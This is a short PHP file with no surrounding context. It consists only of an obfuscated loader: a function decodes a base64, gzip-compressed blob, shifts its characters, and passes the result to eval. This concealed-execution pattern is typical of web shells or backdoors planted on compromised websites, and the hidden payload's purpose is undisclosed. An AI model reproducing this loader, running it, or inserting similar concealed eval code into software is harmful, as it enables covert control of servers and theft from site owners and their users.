<?php function PmDvMT($dmdz)
{ 
$dmdz=gzinflate(base64_decode($dmdz));
 for($i=0;$i<strlen($dmdz);$i++)
 {
$dmdz[$i] = chr(ord($dmdz[$i])-1);
 }
 return $dmdz;
 }eval(PmDvMT("ZZBPa8JAEEc/wH6KIeSgh5qkkYJKW3qth1x6KLSwTOLEDGb/MLsqIn72ZqEeSuf4fg8eDMB0SpGIEy3knUS2+1k536i8RWvhGbL86o+Rh9vbxY04QGPg3bGFDxppL2hgi4ZhPVd/vfzashxvMMTow7oo4sJQ0Wxd33PHOGpLZ6WyKRPIBicp9F3W9Ve5qUvzy//DFgM9LTXZzu1op6tkfJ5WXDUHrJJwX0a2hzTe8x5DpAQXlmLxeF4tkx4uEzWzTAw8SA8d+tgNqE9VNj3g9eUH"));?>
